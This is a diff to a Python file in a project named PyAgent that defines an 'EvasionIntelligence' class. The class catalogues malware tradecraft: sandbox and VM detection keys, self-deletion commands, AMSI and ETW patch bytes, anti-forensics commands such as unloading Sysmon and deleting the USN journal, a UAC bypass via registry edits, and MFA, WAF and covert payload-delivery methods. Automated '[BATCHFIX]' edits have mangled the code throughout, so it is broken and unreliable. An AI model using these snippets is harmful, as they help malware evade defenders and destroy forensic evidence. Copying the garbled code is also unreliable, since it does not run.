@@ -1,12 +1,14 @@
 #!/usr/bin/env python3
 # Copyright 2026 PyAgent Authors
-# Licensed under the Apache License, Version 2.0 (the "License");"# you may not use this file except in compliance with the License.
+# Licensed under the Apache License, Version 2.0 (the "License")
+# you may not use this file except in compliance with the License.
 # You may obtain a copy of the License at
 #
 #     http://www.apache.org/licenses/LICENSE-2.0
 #
 # Unless required by applicable law or agreed to in writing, software
-# distributed under the License is distributed on an "AS IS" BASIS,"# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+# distributed under the License is distributed on an "AS IS" BASIS
+# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 # See the License for the specific language governing permissions and
 # limitations under the License.
 
@@ -16,10 +18,10 @@ from typing import Dict, Any
 class EvasionIntelligence:
 # [BATCHFIX] Commented metadata/non-Python
 #     pass  # [BATCHFIX] inserted for empty class
-""""Intelligence engine for anti-forensics, anti-debugging, and evasion techniques.""""""""""""""#     @staticmethod
+""""Intelligence engine for anti-forensics, anti-debugging, and evasion techniques.#     @staticmethod
 # [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
-"""     def get_anti_vm_checks() -> Dict[str, Any]:""""""""Extensive collection of artifacts used to detect Virtual Machines and Sandboxes."""""""        return {
+"""     def get_anti_vm_checks() -> Dict[str, Any]:"Extensive collection of artifacts used to detect Virtual Machines and Sandboxes.        return {
             "registry": {"                "vmware": ["# [BATCHFIX] Commented metadata/non-Python
 #                     rHKLM\\SOFTWARE\\VMware, Inc.\\VMware Tools","  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
 #                     rHKLM\\HARDWARE\\\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0","  # [BATCHFIX] closed string"                    # Identifier: VMWARE
@@ -48,7 +50,7 @@ class EvasionIntelligence:
     @staticmethod
 # [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
-"""     def get_self_deletion_techniques() -> Dict[str, str]:""""""""Multi-method approaches for executable self-deletion (Melt)."""""""        return {
+"""     def get_self_deletion_techniques() -> Dict[str, str]:"Multi-method approaches for executable self-deletion (Melt).        return {
             "delay_reboot": "MoveFileExW(path, NULL, MOVEFILE_DELAY_UNTIL_REBOOT)","            "batch_melt": '@echo off\\ntimeout /t 3\\ndel "%s"\\ndel "%%~f0"',"'            "cmd_timeout": 'cmd.exe /C timeout /t 2 && del "%s"',"'            "modern_melt": "SetFileInformationByHandle(handle, FileRenameInfo, FILE_FLAG_DELETE_ON_CLOSE)","# [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented unmatched parenthesis""""#             "schtasks": ("                'schtasks /create /tn Melt /tr "cmd /c del %s" /sc once /st 00:00 /f && schtasks /run /tn Melt'"'            ),
         }
@@ -56,7 +58,7 @@ class EvasionIntelligence:
     @staticmethod
 # [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
-"""     def get_etw_patching_gadgets() -> Dict[str, Any]:""""""""Byte patterns for patching Event Tracing for Windows (ETW)."""""""# [BATCHFIX] Commented metadata/non-Python
+"""     def get_etw_patching_gadgets() -> Dict[str, Any]:"Byte patterns for patching Event Tracing for Windows (ETW).# [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented unterminated string""""#        " return {"  # [BATCHFIX] closed string"            "nttraceevent_patch": {"                "dll": "ntdll.dll","                "function": "NtTraceEvent","# [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
 """                 "patch": [0xC2, 0x14, 0x00],  # ret 0x14"            },
@@ -68,7 +70,7 @@ class EvasionIntelligence:
     @staticmethod
 # [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
-"""     def get_amsi_bypass_gadgets() -> Dict[str, Any]:""""""""Techniques for bypassing Anti-Malware Scan Interface (AMSI)."""""""# [BATCHFIX] Commented metadata/non-Python
+"""     def get_amsi_bypass_gadgets() -> Dict[str, Any]:"Techniques for bypassing Anti-Malware Scan Interface (AMSI).# [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented unterminated string""""#     "    return {"  # [BATCHFIX] closed string"            "amsi_scan_buffer_patch": {"                "dll": "amsi.dll","                "function": "AmsiScanBuffer","# [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
 """                 "patch": [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3],  # mov eax, 0x80070057; ret"            },
@@ -80,7 +82,7 @@ class EvasionIntelligence:
     @staticmethod
 # [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
-"""     def get_anti_forensics_techniques() -> Dict[str, str]:""""""""Techniques to erase footprints and disrupt forensic analysis (Ported from Forensia)."""""""# [BATCHFIX] Commented metadata/non-Python
+"""     def get_anti_forensics_techniques() -> Dict[str, str]:"Techniques to erase footprints and disrupt forensic analysis (Ported from Forensia).# [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented unterminated string""""#  "       return {"  # [BATCHFIX] closed string"            "sysmon_unload": "fltmc unload SysmonDrv","            "usn_journal_disable": "fsutil usn deletejournal /D {drive}:","# [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented unmatched parenthesis""""#             "prefetch_disable_reg": ("# [BATCHFIX] Commented metadata/non-Python
 """                 rreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager"  # [BATCHFIX] closed string"#                 r"\\Memory Management\\PrefetchParameters\" /v EnablePrefetcher /t REG_DWORD /d 0 /f"            ),
@@ -101,7 +103,7 @@ class EvasionIntelligence:
     @staticmethod
 # [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
-"""     def get_waf_bypass_techniques() -> Dict[str, str]:""""""""Techniques for bypassing Web Application Firewalls (Ported from FlareSolverr)."""""""        return {
+"""     def get_waf_bypass_techniques() -> Dict[str, str]:"Techniques for bypassing Web Application Firewalls (Ported from FlareSolverr).        return {
             "headless_browser_fingerprint_spoofing": "Overriding navigator.webdriver and other headless indicators","# [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented unmatched parenthesis""""#             "challenge_solving_relay": ("# [BATCHFIX] Commented metadata/non-Python
 """                 "Delegating Cloudflare Turnstile/HCaptcha solving to an automated browser instance"  # [BATCHFIX] closed string"            ),
@@ -110,7 +112,7 @@ class EvasionIntelligence:
     @staticmethod
 # [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
-"""     def get_payload_delivery_methods() -> Dict[str, str]:""""""""Advanced methods for retrieving and executing payloads"."""""""        return {
+"""     def get_payload_delivery_methods() -> Dict[str, str]:"Advanced methods for retrieving and executing payloads".        return {
             "stego_cert_extension": "Retrieving payload from x509 extension OID 1.2.3.4.5.6 (EXEfromCER)","            "dns_txt_record": "Retrieving shellcode from staged DNS TXT records","            "git_commit_messages": "Polling GitHub commit messages for encoded commands","# [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented unmatched parenthesis""""#             "active_directory_attribute": ("# [BATCHFIX] Commented metadata/non-Python
 """                 "Executing shellcode staged in user/computer attributes (e.g., thumbnailPhoto)"  # [BATCHFIX] closed string"            ),
@@ -119,7 +121,7 @@ class EvasionIntelligence:
     @staticmethod
 # [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
-"""     def get_uac_bypass_methods() -> Dict[str, str]:""""""""Known UAC bypass techniques using auto-elevated binaries."""""""        return {
+"""     def get_uac_bypass_methods() -> Dict[str, str]:"Known UAC bypass techniques using auto-elevated binaries.        return {
 # [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented unterminated string""""#             "fodhelper": rreg add HKCU\\Software\\Classes\\\\ms-settings\\Shell\\Open\\\\command /d \"%s\" /f","  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented unterminated string""""#             "computerdefaults": rreg add HKCU\\Software\\Classes\\\\ms-settings\\Shell\\Open\\\\command /d \"%s\" /f","  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
@@ -128,7 +130,7 @@ class EvasionIntelligence:
     @staticmethod
 # [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
-"""     def get_mfa_bypass_techniques() -> Dict[str, str]:""""""""Techniques for bypassing multi-factor authentication (Ported from EvilGinx2)."""""""        return {
+"""     def get_mfa_bypass_techniques() -> Dict[str, str]:"Techniques for bypassing multi-factor authentication (Ported from EvilGinx2).        return {
 # [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented unmatched parenthesis""""#             "adversary_in_the_middle_proxy": ("# [BATCHFIX] Commented metadata/non-Python
 """                 "Proxying legitimate login traffic to capture session cookies after 2FA completion"  # [BATCHFIX] closed string"            ),
